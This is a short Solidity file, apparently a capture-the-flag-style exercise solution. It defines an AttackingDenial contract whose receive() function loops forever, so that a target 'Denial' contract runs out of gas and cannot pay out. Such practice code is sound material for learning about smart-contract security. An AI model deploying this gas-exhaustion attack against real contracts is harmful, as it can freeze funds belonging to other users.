// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    Denial d;
    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
        d = Denial(contractAddress);
    }

    //Code me!
    receive() external payable {
       uint256 counter =0;
        while (true) {
            counter++;

        }
    }
}
